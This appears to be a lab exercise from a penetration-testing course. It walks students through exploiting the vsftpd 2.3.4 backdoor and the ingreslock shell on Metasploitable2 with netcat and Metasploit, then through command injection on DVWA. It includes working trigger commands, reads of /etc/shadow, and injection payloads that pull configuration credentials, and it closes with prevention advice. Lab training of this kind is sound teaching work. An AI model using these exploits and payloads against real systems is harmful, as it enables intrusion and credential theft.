# Lab 4: Exploitation Techniques

**Duration:** ~40 minutes  
**Difficulty:** Intermediate  
**Tools:** Metasploit Framework, netcat, nmap

## 🎯 Objective

Learn the exploitation lifecycle: use Metasploit to research vulnerabilities, then exploit known backdoors on Metasploitable2 to gain root shells. Finally, try command injection on DVWA.

---

## 📖 Background

**Metasploit** is the world's most popular penetration testing framework. It provides:
- A database of **thousands of exploits** for known vulnerabilities
- **Payloads** — code that runs after successful exploitation
- **Post-exploitation modules** — for gathering data after gaining access

Real-world attackers often combine automated tools like Metasploit with **manual exploitation** using basic tools like `netcat`. This lab teaches both approaches.

### The Exploit Lifecycle:
```
Recon → Vulnerability Discovery → Exploit Selection → Exploitation → Post-Exploitation
 Lab 1      Lab 3                    Lab 4 (now)        Lab 4           Lab 4
```

---

## Part A: Researching & Exploiting Backdoors

In Lab 3, you discovered that Metasploitable runs several vulnerable services. Let's research them in Metasploit, then exploit them.

### Step 1: Launch Metasploit

```bash
docker exec -it kali bash
msfconsole
```

Wait for the banner to load (this takes 60-90 seconds in Docker). You'll see:
```
msf6 >
```

### Step 2: Research with Metasploit — Search for Exploits

Let's look up the vsftpd 2.3.4 vulnerability we found in Lab 3:

```
msf6 > search vsftpd
```

Expected output:
```
Matching Modules
================
   #  Name                                  Disclosure Date  Rank       Description
   -  ----                                  ---------------  ----       -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  VSFTPD v2.3.4 Backdoor Command Execution
```

### Step 3: Examine the Module

```
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(...) > info
```

Read the description — this was a **supply chain attack**: someone inserted a backdoor into the vsftpd source code. When a user logs in with a username ending in `:)`, it opens a root shell on port 6200.

```
msf6 exploit(...) > show options
```

```
Module options:
   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s)
   RPORT   21               yes       The target port
```

Now go back to the main prompt:
```
msf6 exploit(...) > back
```

### Step 4: Exploit vsftpd Manually with Netcat

The vsftpd 2.3.4 backdoor is simple: send a username containing `:)` and it opens a root shell on port 6200. Let's trigger it manually:

**Terminal 1** — Trigger the backdoor:
```bash
# Send the backdoor trigger (username with smiley face)
printf "USER backdoor:)\r\nPASS anything\r\n" | nc -w 5 10.10.10.30 21
```

You'll see:
```
220 (vsFTPd 2.3.4)
331 Please specify the password.
```

**Terminal 2** (open a second shell into Kali with `docker exec -it kali bash`):
```bash
# Connect to the backdoor shell on port 6200
nc 10.10.10.30 6200
```

Type commands — you now have a **root shell**:
```bash
whoami
# Output: root

id
# Output: uid=0(root) gid=0(root) groups=0(root)

cat /etc/shadow | head -5
```

Press `Ctrl+C` to exit.

### Step 5: Exploit the Ingreslock Backdoor

Metasploitable also has a root shell listening on port 1524 (the "ingreslock" backdoor). Connect directly:

```bash
nc 10.10.10.30 1524
```

You'll get a root prompt immediately:
```
root@metasploitable:/#
```

### Step 6: Explore the Compromised System

You're now typing commands **on the Metasploitable server**, not on Kali:

```bash
# Who are you?
whoami
# Output: root

# What system is this?
uname -a
# Output: Linux metasploitable 2.6.24-16-server ...

# View all users
cat /etc/passwd

# View password hashes (only root can do this!)
cat /etc/shadow

# List home directories
ls /home/

# Check network configuration
ifconfig
```

### 📝 Questions:
1. What user did you gain access as? Why is this particularly dangerous?
2. How many user accounts exist on the system? (`wc -l /etc/passwd`)
3. Can you find any interesting files in user home directories?

### Step 7: Exit the Shell

```bash
exit
```

> **💡 Key Takeaway:** You didn't need a complex exploit framework — just `netcat` and knowledge of the vulnerability. This is how many real attacks work: known vulnerabilities + simple tools = full compromise.

---

## Part B: DVWA Command Injection

Now let's exploit a web application vulnerability manually.

### Step 8: Authenticate to DVWA

DVWA's Command Injection page lets you ping an IP address. But it doesn't sanitize input properly.

DVWA's database is already initialized automatically when the lab starts (`make start`). You just need to **log in** and save the session cookie:

```bash
# === DVWA: Authenticate and save session ===
COOKIE_JAR=/tmp/dvwa.cookies
rm -f $COOKIE_JAR

# Log in (default creds: admin / password)
LOGIN_PAGE=$(curl -s -c $COOKIE_JAR "http://10.10.10.20/login.php")
TOKEN=$(echo "$LOGIN_PAGE" | grep -oP 'user_token. value=.\K[a-f0-9]+')
curl -s -b $COOKIE_JAR -c $COOKIE_JAR -L \
  -d "username=admin&password=password&Login=Login&user_token=$TOKEN" \
  "http://10.10.10.20/login.php" -o /dev/null

echo "DVWA session saved to $COOKIE_JAR"
```

> **Why this matters:** DVWA uses session cookies and CSRF tokens. Without a valid authenticated session, requests redirect to the login page and return nothing useful. This is realistic — most web apps require authentication before you can reach vulnerable pages.

### Step 9: Command Injection via curl

Now use the saved session cookie to inject commands. The `;` character ends the `ping` command and starts a new one:

```bash
# Normal request — just ping
curl -s -b $COOKIE_JAR \
  "http://10.10.10.20/vulnerabilities/exec/" \
  -d "ip=127.0.0.1&Submit=Submit" | sed -n '/<pre>/,/<\/pre>/p'
```

Now inject a command after the IP:
```bash
# Command injection — whoami
curl -s -b $COOKIE_JAR \
  "http://10.10.10.20/vulnerabilities/exec/" \
  -d "ip=127.0.0.1%3Bwhoami&Submit=Submit" | sed -n '/<pre>/,/<\/pre>/p'
```

You should see the ping output followed by `www-data` — that's the web server user. The `;` (URL-encoded as `%3B`) tells the shell to run `whoami` after the ping.

### Step 10: Try Increasingly Dangerous Commands

Each of these demonstrates what an attacker could do:

```bash
# Read system files
curl -s -b $COOKIE_JAR \
  "http://10.10.10.20/vulnerabilities/exec/" \
  -d "ip=127.0.0.1%3Bcat+/etc/passwd&Submit=Submit" | sed -n '/<pre>/,/<\/pre>/p'

# Check what user the web server runs as
curl -s -b $COOKIE_JAR \
  "http://10.10.10.20/vulnerabilities/exec/" \
  -d "ip=127.0.0.1%3Bid&Submit=Submit" | sed -n '/<pre>/,/<\/pre>/p'

# List the web application files
curl -s -b $COOKIE_JAR \
  "http://10.10.10.20/vulnerabilities/exec/" \
  -d "ip=127.0.0.1%3Bls+-la+/var/www/html/&Submit=Submit" | sed -n '/<pre>/,/<\/pre>/p'

# View DVWA's database configuration (credentials in plain text!)
curl -s -b $COOKIE_JAR \
  "http://10.10.10.20/vulnerabilities/exec/" \
  -d "ip=127.0.0.1%3Bcat+/var/www/html/config/config.inc.php&Submit=Submit" | sed -n '/<pre>/,/<\/pre>/p'
```

> **Tip:** The `sed` command extracts just the `<pre>` output block so you don't see the full HTML page. You can also try other command separators: `|` (pipe), `||` (OR), `&&` (AND).

### Why this is critical:
In real applications, command injection can lead to:
- Reading sensitive files (databases, configs, credentials)
- Installing backdoors
- Pivoting to other systems on the network
- Complete server takeover

---

## 🛡️ How to Prevent These Attacks

### vsftpd Backdoor:
- **Keep software updated** — this was a supply chain attack; the malicious code was in the official download
- **Verify checksums** of downloaded software
- **Monitor for unusual network connections** — a shell on port 6200 or 1524 should trigger alerts

### Command Injection:
```php
// ❌ VULNERABLE — directly uses user input in shell command
$output = shell_exec("ping -c 4 " . $_POST['ip']);

// ✅ SAFE — validates input is actually an IP address
$ip = $_POST['ip'];
if (filter_var($ip, FILTER_VALIDATE_IP)) {
    $output = shell_exec("ping -c 4 " . escapeshellarg($ip));
} else {
    $output = "Invalid IP address.";
}
```

**Key defenses:**
1. **Input validation** — Only allow expected characters
2. **Parameterized commands** — Use `escapeshellarg()` or avoid shell entirely
3. **Least privilege** — Don't run web servers as root
4. **WAF** — Web Application Firewalls can block common injection patterns

---

## 🏆 Summary

| Skill | What you did |
|-------|-------------|
| Metasploit research | `search`, `use`, `info`, `show options` |
| Manual exploitation | Triggered vsftpd backdoor with netcat |
| Backdoor access | Connected to ingreslock root shell on port 1524 |
| Post-exploitation | Explored compromised system, read sensitive files |
| Web app authentication | Set up DVWA session with CSRF tokens and cookies |
| Web exploitation | Command injection via unsanitized input |
| Defense understanding | Input validation, parameterization, least privilege |

---

## ➡️ Next: [Lab 5: Mini CTF Challenge](lab5-ctf.md) — Put everything together!
